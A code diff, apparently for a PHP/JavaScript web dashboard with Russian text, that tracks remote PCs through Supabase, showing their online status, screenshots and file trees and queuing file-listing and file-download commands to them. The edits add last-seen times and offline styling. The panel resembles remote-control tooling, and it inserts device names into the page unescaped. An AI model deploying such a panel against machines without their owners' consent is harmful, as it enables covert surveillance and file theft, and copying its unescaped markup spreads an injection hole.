@@ -14,7 +14,6 @@ $cache_dir = __DIR__ . '/explorer_cache/';
 if (!is_dir($cache_dir)) mkdir($cache_dir, 0777, true);
 
 // ФУНКЦИЯ ДЛЯ ЗАПРОСОВ К SUPABASE
-def_supabase:
 function supabaseRequest($endpoint, $method = 'GET', $data = null, $extraHeaders = []) {
     $ch = curl_init(SUPABASE_URL . $endpoint);
     $headers = [
@@ -111,17 +110,26 @@ if (isset($_GET['api_refresh_all'])) {
             $last_file_ptr = $cache_dir . $id . '_lastfile.txt';
             $screen_file = __DIR__ . '/screenshots/screen_' . $id . '.jpg';
             
-            $time_raw = $d["time"] ?? ""; $last = 0;
+            $time_raw = $d["time"] ?? ""; 
+            $last = 0;
+            $formatted_last_seen = "Никогда";
+
             if (!empty($time_raw)) {
-                $time_raw = str_replace('T', ' ', $time_raw);
-                $time_raw = preg_replace('/\.\d+Z?/', '', $time_raw);
-                $last = @strtotime($time_raw);
+                $time_clean = str_replace('T', ' ', $time_raw);
+                $time_clean = preg_replace('/\.\d+Z?/', '', $time_clean);
+                $last = @strtotime($time_clean);
+                if ($last > 0) {
+                    $formatted_last_seen = date('d.m.Y H:i:s', $last);
+                }
             }
-            $isOnline = ((time() - $last) <= 35 && $last > 0);
+
+            // ПК считает в сети, если отправлял сигнал в течение последних 40 секунд
+            $isOnline = ((time() - $last) <= 40 && $last > 0);
 
             $explorer_data[$id] = [
                 "name" => $d["name"] ?? "Неизвестный ПК",
                 "is_online" => $isOnline,
+                "last_seen" => $formatted_last_seen,
                 "current_path" => file_exists($path_file) ? file_get_contents($path_file) : 'C:\\',
                 "last_file" => file_exists($last_file_ptr) ? file_get_contents($last_file_ptr) : '',
                 "items" => file_exists($tree_file) ? json_decode(file_get_contents($tree_file), true) : [],
@@ -193,13 +201,11 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && !isset($_POST['login_password'])) {
     
     if (!empty($action)) {
         if ($action === "clear_commands") {
-            // Очистка таблицы команд в Supabase
             supabaseRequest('/commands?id=gt.0', 'DELETE', null, ["Prefer: return=minimal"]);
         } else {
             if (($action === "get_files" || $action === "download_file") && !empty($target_path)) {
                 $action = $action . "::" . $target_path;
             }
-            // Отправка новой команды в Supabase
             supabaseRequest('/commands', 'POST', [
                 "device_id" => $device_id,
                 "action" => $action,
@@ -225,10 +231,11 @@ body{ margin:0; font-family:system-ui, sans-serif; background:#090d16; color:#e2
 .container{ padding:24px; display:grid; grid-template-columns:repeat(auto-fill,minmax(360px,1fr)); gap:20px; }
 .card{ background:#111827; border:1px solid #1f2937; border-radius:14px; padding:20px; transition: 0.3s;}
 .online-card { border-color: #064e3b; box-shadow: 0 4px 20px rgba(4,120,87,0.15); }
+.offline-card { border-color: #1f2937; opacity: 0.85; }
 .name{ font-weight:700; font-size:17px; margin-bottom:6px; color:#f8fafc;}
 .status{ font-size:11px; padding:4px 10px; border-radius:999px; display:inline-block; font-weight:bold; text-transform:uppercase;}
 .online { background:#064e3b; color:#34d399; } .offline { background:#374151; color:#9ca3af; }
-.row{ margin-top:10px; font-size:13px; color:#94a3b8; word-break: break-all;}
+.row{ margin-top:8px; font-size:13px; color:#94a3b8; word-break: break-all;}
 button, .btn-link{ width:100%; margin-top:8px; padding:10px; border-radius:8px; border:none; cursor:pointer; font-weight:600; display:block; text-align:center; box-sizing:border-box; text-decoration:none; font-size:13px; transition: 0.2s;}
 .blue { background:#4f46e5; color:white; } .blue:hover{ background:#4338ca; }
 .green { background:#059669; color:white; } .green:hover{ background:#047857; }
@@ -253,7 +260,7 @@ th { color: #64748b; font-size: 11px; text-transform: uppercase;}
 </div>
 
 <div class="container" id="devices_container">
-    <div style="color:#4b5563; grid-column: 1/-1; text-align:center; padding:40px;">Ожидание подключения ПК...</div>
+    <div style="color:#4b5563; grid-column: 1/-1; text-align:center; padding:40px;">Загрузка списка устройств...</div>
 </div>
 
 <div class="log-section">
@@ -283,7 +290,7 @@ function sendCmdAsync(deviceId, action, targetPath = '') {
     formData.append('device_id', deviceId);
     formData.append('target_path', targetPath);
     formData.append('js_async', '1');
-    fetch(window.location.href, { method: 'POST', body: formData }).catch(err => console.error(err));
+    fetch(window.location.href, { method: 'POST', body: formData }).catch(err => console.error("Ошибка отправки:", err));
 }
 
 function startRealtimeMonitor() {
@@ -295,12 +302,12 @@ function startRealtimeMonitor() {
             let hasDevices = Object.keys(data.devices).length > 0;
             
             if (!hasDevices) {
-                container.innerHTML = `<div style="color:#4b5563; grid-column:1/-1; text-align:center; padding:40px;">Нет активных ПК...</div>`;
+                container.innerHTML = `<div style="color:#4b5563; grid-column:1/-1; text-align:center; padding:40px;">Нет зафиксированных ПК в базе</div>`;
             } else {
                 let containerHtml = '';
                 for (let id in data.devices) {
                     let pc = data.devices[id];
-                    let cardClass = pc.is_online ? 'card online-card' : 'card';
+                    let cardClass = pc.is_online ? 'card online-card' : 'card offline-card';
                     let statusClass = pc.is_online ? 'status online' : 'status offline';
                     let statusText = pc.is_online ? 'В сети' : 'Не в сети';
                     
@@ -329,9 +336,13 @@ function startRealtimeMonitor() {
 
                     containerHtml += `
                     <div class="${cardClass}">
-                        <div class="name">${pc.name}</div>
-                        <div class="${statusClass}">${statusText}</div>
+                        <div style="display:flex; justify-space-between; align-items:center;">
+                            <div class="name">${pc.name}</div>
+                            <div class="${statusClass}">${statusText}</div>
+                        </div>
                         <div class="row"><b>ID:</b> <span style="font-family:monospace;">${id}</span></div>
+                        <div class="row"><b>Был в сети:</b> <span style="color:${pc.is_online ? '#34d399' : '#9ca3af'};">${pc.last_seen}</span></div>
+                        
                         <hr style="border-color:#1f2937; margin:12px 0;">
                         <div class="name" style="font-size:14px;">📂 Проводник:</div>
                         <span style="font-size:11px; color:#64748b; font-family:monospace; display:block; margin-bottom:4px;">${pc.current_path}</span>
@@ -371,7 +382,7 @@ function startRealtimeMonitor() {
                 logsBody.innerHTML = logsHtml;
             }
         })
-        .catch(err => console.error("Ошибка:", err));
+        .catch(err => console.error("Ошибка получения данных:", err));
     }, 1500);
 }
 
